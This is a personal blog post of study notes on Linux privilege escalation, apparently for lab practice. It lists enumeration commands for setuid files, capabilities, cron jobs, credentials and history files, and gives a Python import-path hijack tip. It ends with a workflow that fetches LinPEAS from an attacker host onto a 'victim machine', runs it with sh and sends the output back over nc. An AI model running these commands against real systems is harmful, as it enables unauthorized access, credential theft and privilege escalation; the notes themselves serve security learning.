---
layout: post
title: "Linux Priviledge Escallation Resources"
categories: [resources]
tags: []
author: "SoftAndoWetto"
---

# Starter

Some shells are “dumb” and don’t allow job control or proper signal handling. Upgrading to a TTY allows for Ctrl+C, arrow keys, tab completion, and better interactivity:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
<br><br><br>


This just fixes the shell and lets u use clear (It tells the shell what kind of terminal is being used)
```bash
export TERM=xterm
```
<br><br><br>



# Privilege Escalation (OS, Kernel, Services)

Check the OS version and kernel. Knowing this helps identify vulnerabilities or misconfigurations specific to the OS/kernel:
```bash
uname -a
```
<br><br><br>

Info about the Linux Distro
```bash
cat /etc/lsb-release
```
<br><br><br>

Info about the Linux Distro (All distros and more info)
```bash
cat /etc/os-release
```
<br><br><br>


Check what version of sudo is running
```bash
sudo -V
```
<br><br><br>


Check what commands I can run with sudo without needing a password
```bash
sudo -l
```
<br><br><br>


Create a list of all currently installed packages
```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```
<br><br><br>


Shows Binaries on the system
```bash
ls -l /bin /usr/bin/ /usr/sbin/
```
<br><br><br>


Files that a user can execute as root without passwords (with the setuid bit set to s)
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
<br><br><br>


Lists all root-owned files with setuid and setgid bits, which run with elevated privileges when executed.
```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
<br><br><br>


Get capabilities (individual sudo permissions an app can run) from all apps
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
<br><br><br>


Checks if any packages on GTFOBins are installed on the system (THIS IS GOOD)
```bash
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```
<br><br><br>


Scheduled tasks that run as root may be vulnerable if you can modify scripts:
```bash
ls -la /etc/cron.daily/
```
<br><br><br>


Processes running as root can indicate privilege escalation opportunities:
```bash
ps aux | grep root
```
<br><br><br>


Who is logged in and what they are running can help find active users, shells, or processes to target:
```bash
ps au
```
<br><br><br>



# System Info & Environment

Check environment variables (might have a password or smthn)
```bash
env
```
<br><br><br>


IDK what this does yet, they didnt explain
```bash
echo $PATH
```
<br><br><br>


Check the shells that exist on the system
```bash
cat /etc/shells
```
<br><br><br>


Find user login shells in /etc/passwd
```bash
grep "sh$" /etc/passwd
```
<br><br><br>


Check what groups are on the system
```bash
cat /etc/group
```
<br><br><br>


List members of any group on the system
```bash
getent group sudo
```
<br><br><br>


Check when a user last logged in
```bash
lastlog
```
<br><br><br>


Check who else is logged in
```bash
w
```
<br><br><br>



# Files, Configs & Credential Hunting

User home directories may contain sensitive information (SSH keys, scripts, credentials). Accessing these can help in lateral movement or privilege escalation.

Users often leave sensitive commands in their history, like sudo commands or credentials:
```bash
history
```
<br><br><br>


Look for all (reasonable) config files on a system
```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```
<br><br><br>


Find all configuration files
```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
<br><br><br>


Find scripts on the system
```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```
<br><br><br>


Find all hidden files on a system
```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null
```
<br><br><br>


Find all hidden directories
```bash
find / -type d -name ".*" -ls 2>/dev/null
```
<br><br><br>


View all temporary files
```bash
ls -l /tmp /var/tmp /dev/shm
```
<br><br><br>


Finding history files
```bash
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
<br><br><br>


Lists the commands of all processes running on the system
```bash
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```
<br><br><br>


Find world writable files on a system (useful for finding cron scripts to edit)
```bash
find / -path /proc -prune -o -type f -perm -o+w -exec ls -lda {} \; 2>/dev/null
```
<br><br><br>


Find writable directories (potential for dropping scripts or escalating privileges):
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
<br><br><br>



# Networking

check what out interfacing are saying
```bash
ip a
```
<br><br><br>


Check what other networks are accessible
```bash
route
```
<br><br><br>


Check DNS configuration (Might contain Active Directory information)
```bash
cat /etc/resolv.conf
```
<br><br><br>


See if there is anything in /etc/hosts
```bash
cat /etc/hosts
```
<br><br><br>


Check what other hosts the target as been talking too
```bash
arp -a
```
<br><br><br>



# Python Priv Esc

Check permissions for any files that are run (both the running file and the module it calls)
- You can change the main module file if you have permission

- Or you can run this and check if the module has a low priority (the order of the output is the order python checks to import a file so if u can place it above it will call your code)


```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```
<br><br><br>



# Running LinPEAS and Outputting to Host Machine

Download LinPEAS:
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
```
<br><br><br>


Start a simple HTTP server on your host to serve the file:
```bash
python -m http.server
```
<br><br><br>


Listen on your host machine to capture LinPEAS output:
```bash
nc -lvnp 9002 | tee linpeas.out
```
<br><br><br>


On the victim machine, fetch and run LinPEAS, and pipe output back to your host:
```bash
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
```
<br><br><br>



# Misc (IDK where to put them)

They say to check for these (IDK where to put this other than misc)

- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield?utm_source=chatgpt.com)
- [iptables](https://linux.die.net/man/8/iptables?utm_source=chatgpt.com)
- [AppArmor](https://apparmor.net/?utm_source=chatgpt.com)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux?utm_source=chatgpt.com)
- [Fail2ban](https://github.com/fail2ban/fail2ban?utm_source=chatgpt.com)
- [Snort](https://www.snort.org/faq/what-is-snort?utm_source=chatgpt.com)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall?utm_source=chatgpt.com)

Checks the dependencies for a custom dynamic library

```bash
ldd <applicaiton>
```